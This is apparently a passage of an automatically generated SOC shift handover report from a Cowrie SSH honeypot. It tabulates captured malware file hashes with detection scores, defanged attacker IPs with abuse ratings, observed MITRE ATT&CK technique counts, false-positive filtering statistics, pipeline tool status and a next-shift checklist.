| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `193.24.211[.]100` | BG | Layer7 Networks GmbH | **100** ⚠️ | 7 |
| `223.123.124[.]182` | PK | CMPak Limited | **100** ⚠️ | 5 |
| `111.228.58[.]144` | CN | eleven street,No. 18 Institute of Jingdong headquarters | **100** ⚠️ | 7 |
| `103.43.191[.]43` | HK | West263 International Limited | **100** ⚠️ | 50 |
| `220.190.103[.]234` | CN | CHINANET-ZJ Wenzhou node network | **100** ⚠️ | 2 |
| `101.126.11[.]137` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `116.147.40[.]93` | CN | China United Network Communications Corporation Limited | **100** ⚠️ | 50 |
| `94.29.124[.]154` | RU | Moscow Local Telephone Network (OAO MGTS) | **100** ⚠️ | 13 |
| `49.75.185[.]71` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `20.118.202[.]126` | US | Microsoft Corporation | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 36 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 7 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 7 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |

---

## 🔕 False Positive Summary (183 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 29 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 14 below threshold 25 | 7 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 144 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 707 cases |
| Tool 34  | Credential Extractor        | ✅ 14 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 42 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 183 filtered (25.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 36 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 7 priority case(s) shown individually · 15 recon entry/entries in table (5 group(s) consolidating 507 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-12T21:23:35Z_
